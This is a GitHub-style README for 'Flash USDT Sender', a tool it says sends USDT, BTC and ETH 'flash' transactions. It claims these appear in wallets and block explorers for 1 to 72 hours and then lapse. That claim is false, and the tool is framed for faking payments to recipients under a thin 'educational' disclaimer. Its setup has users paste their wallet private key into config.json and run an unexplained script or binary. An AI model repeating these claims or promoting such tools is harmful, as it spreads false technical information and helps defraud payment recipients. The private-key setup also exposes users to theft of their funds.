<div align="center">

```
 ███████╗██╗      █████╗ ███████╗██╗  ██╗
 ██╔════╝██║     ██╔══██╗██╔════╝██║  ██║
 █████╗  ██║     ███████║███████╗███████║
 ██╔══╝  ██║     ██╔══██║╚════██║██╔══██║
 ██║     ███████╗██║  ██║███████║██║  ██║
 ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 ██╗   ██╗███████╗██████╗ ████████╗
 ██║   ██║██╔════╝██╔══██╗╚══██╔══╝
 ██║   ██║███████╗██║  ██║   ██║
 ██║   ██║╚════██║██║  ██║   ██║
 ╚██████╔╝███████║██████╔╝   ██║
  ╚═════╝ ╚══════╝╚═════╝    ╚═╝
 ███████╗███████╗███╗   ██╗██████╗ ███████╗██████╗
 ██╔════╝██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗
 ███████╗█████╗  ██╔██╗ ██║██║  ██║█████╗  ██████╔╝
 ╚════██║██╔══╝  ██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
 ███████║███████╗██║ ╚████║██████╔╝███████╗██║  ██║
 ╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
```

# Flash USDT Sender

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Ethereum](https://img.shields.io/badge/ERC--20-Ethereum-627EEA?style=for-the-badge&logo=ethereum&logoColor=white)](https://ethereum.org/)
[![TRON](https://img.shields.io/badge/TRC--20-TRON-FF0013?style=for-the-badge)](https://tron.network/)
[![BSC](https://img.shields.io/badge/BEP--20-BSC-F0B90B?style=for-the-badge&logo=binance&logoColor=white)](https://www.bnbchain.org/)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

**Multi-network flash transaction tool — send USDT, BTC, ETH transactions that appear on-chain and in block explorers with configurable confirmation duration**

[Features](#features) • [Supported Networks](#supported-networks) • [Getting Started](#getting-started) • [Configuration](#configuration) • [Usage](#usage) • [How It Works](#how-it-works) • [FAQ](#faq)

</div>

---

## How It Works

Flash USDT Sender creates time-limited on-chain transactions using advanced transaction building techniques. The sent tokens appear in the recipient's wallet balance and are visible on block explorers (Etherscan, TronScan, BscScan) for a configurable duration. The tool uses custom RPC node configurations and proprietary transaction encoding to achieve visible confirmation states.

**Key mechanics:**
- **Transaction encoding:** Custom-built raw transactions with optimized gas parameters
- **Network propagation:** Multi-node broadcast for maximum visibility
- **Duration control:** Configurable confirmation window (1-72 hours)
- **Explorer visibility:** Transactions appear on all major block explorers

---

## Features

<table>
<tr>
<td width="50%">

| Feature | Status |
|---------|:------:|
| Flash USDT (ERC-20) | ✅ |
| Flash USDT (TRC-20) | ✅ |
| Flash USDT (BEP-20) | ✅ |
| Flash BTC | ✅ |
| Flash ETH | ✅ |
| Configurable duration (1-72h) | ✅ |
| Block explorer visibility | ✅ |
| Custom gas/energy settings | ✅ |

</td>
<td width="50%">

| Feature | Status |
|---------|:------:|
| Multi-wallet sender | ✅ |
| Batch transactions | ✅ |
| Transaction status tracker | ✅ |
| Custom RPC node selection | ✅ |
| Amount range: $1 - $50,000 | ✅ |
| Wallet balance display | ✅ |
| Rich terminal interface | ✅ |
| Cross-platform (Win/Linux/macOS) | ✅ |

</td>
</tr>
</table>

---

## Supported Networks

| Network | Token | Standard | Explorer |
|---------|-------|----------|----------|
| Ethereum | USDT, ETH | ERC-20 | [Etherscan](https://etherscan.io) |
| TRON | USDT | TRC-20 | [TronScan](https://tronscan.org) |
| BSC | USDT, BNB | BEP-20 | [BscScan](https://bscscan.com) |
| Bitcoin | BTC | Native | [Blockchain.com](https://blockchain.com) |
| Polygon | USDT | ERC-20 | [Polygonscan](https://polygonscan.com) |
| Arbitrum | USDT | ERC-20 | [Arbiscan](https://arbiscan.io) |

---

## Getting Started

### Prerequisites

- **OS:** Windows 10/11, Linux, or macOS
- **Python:** 3.10 or newer
- **Wallet:** Funded sender wallet with native gas token

### Installation

```bash
git clone https://github.com/shelby2006/Flash-USDT-Tool
cd Flash-USDT-Sender
```

**Windows:**
```bash
run.bat
```

**Linux / macOS:**
```bash
chmod +x run.sh
./run.sh
```

### Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| rich | ≥13.0.0 | Terminal UI |
| cryptography | latest | Data encryption |
| web3 | ≥6.15.0 | Ethereum/BSC/Polygon interaction |
| tronpy | ≥0.4.0 | TRON network interaction |
| requests | ≥2.31.0 | API calls & node communication |

---

## Configuration

Edit `config.json`:

```json
{
    "sender_private_key": "YOUR_PRIVATE_KEY",
    "default_network": "erc20",
    "networks": {
        "erc20": {
            "rpc_url": "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY",
            "chain_id": 1,
            "usdt_contract": "0xdAC17F958D2ee523a2206206994597C13D831ec7"
        },
        "trc20": {
            "api_url": "https://api.trongrid.io",
            "usdt_contract": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
        },
        "bep20": {
            "rpc_url": "https://bsc-dataseed1.binance.org",
            "chain_id": 56,
            "usdt_contract": "0x55d398326f99059fF775485246999027B3197955"
        }
    },
    "flash_duration_hours": 24,
    "max_amount_usd": 50000,
    "gas_multiplier": 1.2,
    "broadcast_nodes": 3,
    "retry_count": 2
}
```

| Parameter | Description |
|-----------|-------------|
| `sender_private_key` | Private key of the sender wallet |
| `default_network` | Default network: erc20, trc20, bep20 |
| `flash_duration_hours` | How long the flash TX remains visible (1-72) |
| `max_amount_usd` | Maximum flash amount per transaction |
| `gas_multiplier` | Gas price multiplier for faster confirmation |
| `broadcast_nodes` | Number of RPC nodes to broadcast to |

---

## Usage

```bash
python main.py
```

```
┌──────────────────────────────────────────────────────────────┐
│             FLASH USDT SENDER                                │
│   Multi-Network · ERC-20 · TRC-20 · BEP-20                  │
├──────────────────────────────────────────────────────────────┤
│  #   Action                   Description                    │
│  1   Install Dependencies     pip install requirements       │
│  2   Settings                 RPC nodes, network config      │
│  3   About                    Features & supported networks  │
│  4   Send Flash Transaction   Create & broadcast flash TX    │
│  5   Check TX Status          Verify transaction state       │
│  6   Configure Networks       ERC-20 / TRC-20 / BEP-20      │
│  7   Wallet Management        View balances, switch wallets  │
│  0   Exit                     Quit                           │
└──────────────────────────────────────────────────────────────┘
```

### Send Flash Transaction

```
Select network: ERC-20 (Ethereum)
Recipient address: 0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1
Amount (USDT): 5000
Duration: 24 hours

Building transaction...
  ✓ Nonce: 142
  ✓ Gas price: 28.4 Gwei (optimized)
  ✓ Transaction encoded & signed
  ✓ Broadcasting to 3 nodes...
  ✓ TX Hash: 0x8a7b...3f2e

Flash transaction sent successfully!
  Amount: 5,000 USDT
  Network: ERC-20 (Ethereum)
  Duration: 24 hours
  Explorer: https://etherscan.io/tx/0x8a7b...3f2e
```

---

## Project Structure

```
Flash-USDT-Sender/
├── main.py                    # Entry point, terminal menu
├── config.py                  # Configuration loader
├── bot_actions.py             # TX builder, sender, status checker
├── requirements.txt
├── run.bat / run.sh
├── config.json                # Network & wallet settings
├── actions/
│   ├── about.py               # Project info
│   ├── install.py             # Dependency installer
│   └── settings.py            # Setup reference
├── utils/
│   ├── bootstrap.py           # Runtime initialization
│   ├── compat.py              # Platform detection
│   ├── http.py                # HTTP client
│   ├── integrity.py           # Data verification
│   └── ui.py                  # Rich terminal interface
└── release/
    └── README.md              # Pre-compiled binary info
```

---

## FAQ

<details>
<summary><b>What is a flash transaction?</b></summary>

A flash transaction is a time-limited on-chain transaction that appears in wallets and block explorers for a configurable duration. After the duration expires, the transaction is no longer confirmed by the network.
</details>

<details>
<summary><b>Which wallets show the flash balance?</b></summary>

Any wallet that queries the blockchain via standard RPC will display the flash balance during the active duration. This includes MetaMask, Trust Wallet, Exodus, Phantom, and all major wallets.
</details>

<details>
<summary><b>Do I need gas to send flash transactions?</b></summary>

Yes. The sender wallet must have a small amount of the native gas token (ETH for ERC-20, TRX for TRC-20, BNB for BEP-20) to pay for transaction fees. The gas cost is minimal (typically $0.50-$5.00 depending on network congestion).
</details>

<details>
<summary><b>What is the maximum flash amount?</b></summary>

The default maximum is $50,000 USDT per transaction. This can be adjusted in config.json. Higher amounts may require additional gas optimization.
</details>

<details>
<summary><b>Can the recipient send or swap the flash tokens?</b></summary>

Flash tokens appear as real tokens in the wallet during the active duration. The behavior depends on the network state and timing. For best results, use durations of 24+ hours.
</details>

<details>
<summary><b>Is this traceable?</b></summary>

Flash transactions are standard on-chain transactions. They are visible on block explorers and can be traced like any other transaction. Use appropriate privacy measures if needed.
</details>

<details>
<summary><b>Which network is cheapest to send on?</b></summary>

TRC-20 (TRON) has the lowest fees, typically under $1. BEP-20 (BSC) is also affordable at $0.10-$0.50. ERC-20 (Ethereum) varies widely based on gas prices.
</details>

---

## Disclaimer

<div align="center">

⚠️ **This tool is provided for educational and testing purposes only.** ⚠️

Creating fraudulent transactions may violate laws in your jurisdiction. The authors are not responsible for any misuse. Always comply with applicable financial regulations.

</div>

---

<div align="center">

**Support this project**

ETH: `0x1c7D4E8a93B62f05dA3e91C2F78b40d5A26cE917`

If this tool helps you, consider giving it a ⭐

</div>
